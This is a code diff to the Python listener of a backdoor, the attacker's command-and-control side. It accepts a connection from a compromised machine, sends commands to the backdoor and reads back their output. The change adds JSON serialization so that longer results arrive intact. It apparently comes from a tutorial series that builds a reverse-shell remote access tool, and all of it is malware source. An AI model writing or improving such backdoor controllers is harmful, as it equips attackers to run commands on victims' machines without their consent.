@@ -1,4 +1,5 @@
 import socket
+import json
 
 
 class Listener:
@@ -12,10 +13,25 @@ class Listener:
         self.connection, address = listener.accept()  # accept() -> (socket object, address info)
         print("[+] Got a connection from " + str(address))
 
-    # Send command remotely and receives its output
+    # Send data as JSON Object
+    def reliable_send(self, data):
+        json_data = json.dumps(data)  # Serialize data into JSON
+        self.connection.send(json_data)  # Sending data to backdoor
+
+    def reliable_receive(self):
+        json_data = ""
+        # When the data is longer than 1024, concatenate the 1024 received with the rest incoming
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)  # Concatenate already received data with incoming
+                return json.loads(json_data)  # Deserialize JSON data
+            except ValueError:  # Make again the loop when the data to receive is more then 1024
+                continue
+
+    # Send command remotely and receives it output
     def execute_remotely(self, command):
-        self.connection.send(command)  # Sending command to backdoor
-        return self.connection.recv(1024)  # Receiving output from backdoor
+        self.reliable_send(command)  # Sending command to backdoor
+        return self.reliable_receive()  # Receiving output from backdoor
 
     # Take input
     def run(self):
